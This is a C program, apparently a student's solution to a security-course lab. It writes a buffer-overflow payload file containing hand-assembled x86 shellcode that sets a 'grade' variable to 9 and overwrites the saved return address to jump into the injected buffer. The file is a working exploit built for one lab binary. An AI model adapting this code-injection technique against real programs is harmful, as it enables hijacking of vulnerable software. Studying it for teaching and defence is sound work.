#include <stdio.h>

/*#define BUFSIZE 48*/

int main()
{
    int i;
    FILE *fp;
    fp = fopen("data9", "w");
    /*Fill the buffer (48 chars) with zeros and add 4 extra zero to reach the variable i*/
    fprintf(fp, "Manos Alexandros"); /*16 chars*/
    fputc('\0', fp);                 /*end of string and to avoid warnings*/

    /*movb -> c6 05*/
    fputc('\xc6', fp);
    fputc('\x05', fp);
    /*grade address-> 0x80e3068*/
    fputc(104, fp);
    fputc(48, fp);
    fputc(14, fp);
    fputc(8, fp);
    /*grade = 9*/
    fputc('\x39', fp);

    /*mov -> b8*/
    fputc('\xb8', fp);
    /*Next instruction after the readString call -> 0x8049e72*/
    /*If my name is Angelos Bilas i should propably return after the if state
     (after the grade = 6)*/
    fputc('\x72', fp);
    fputc('\x9e', fp);
    fputc('\x04', fp);
    fputc('\x08', fp);

    fputc('\xff', fp); /*jmp -> ff*/
    fputc('\xe0', fp); /*%eax*/

    for (i = 0; i < 21; i++) /*48 + 4 - 31*/
    {
        fputc('0', fp);
    }
    /*change the value of i to 68*/
    /*buf + i = returning address (in stack)*/
    fputc(68, fp);

    /*Returning address -> 80E42F1, 0x80e42e0(hex, =&Name) + 17(dec, my name)*/
    fputc('\xf1', fp);
    fputc('\x42', fp);
    fputc('\x0e', fp);
    fputc('\x08', fp);

    fputc(224, fp); /*restore s bss*/
    fputc(66, fp);  /*(char (*)[48]) 0x80e42e0 <Name>*/
    fputc(14, fp);
    fputc(8, fp);

    fclose(fp);
    return 0;
}
